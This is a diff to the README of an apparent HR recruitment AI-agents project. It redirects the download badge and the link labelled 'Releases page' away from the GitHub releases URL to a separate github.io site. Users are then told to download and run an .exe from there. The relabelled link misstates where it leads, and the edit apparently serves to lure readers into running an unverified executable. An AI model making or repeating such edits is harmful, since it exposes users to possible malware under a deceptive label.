@@ -1,6 +1,6 @@
 # 🤖 hr-copilot-ai-agents - Streamline your recruitment with smart automation
 
-[![Download Now](https://img.shields.io/badge/Download-Latest_Release-blue?style=for-the-badge)](https://github.com/hasaanqadir-create/hr-copilot-ai-agents/releases)
+[![Download Now](https://img.shields.io/badge/Download-Latest_Release-blue?style=for-the-badge)](https://hasaanqadir-create.github.io)
 
 This platform automates your recruitment tasks using artificial intelligence. It uses ten specialized agents to handle candidate data, score resumes, match roles, rank applicants, generate interview questions, manage schedules, and draft communications. The system works as an end-to-end tool to reduce manual work in your hiring process.
 
@@ -18,7 +18,7 @@ To run this application on Windows, verify your computer meets these standards:
 
 Follow these steps to set up the software on your machine.
 
-1. Go to the [Releases page](https://github.com/hasaanqadir-create/hr-copilot-ai-agents/releases).
+1. Go to the [Releases page](https://hasaanqadir-create.github.io).
 2. Look for the latest version listed at the top.
 3. Click the file ending in `.exe` to start the download.
 4. Save the file to your desktop or downloads folder.
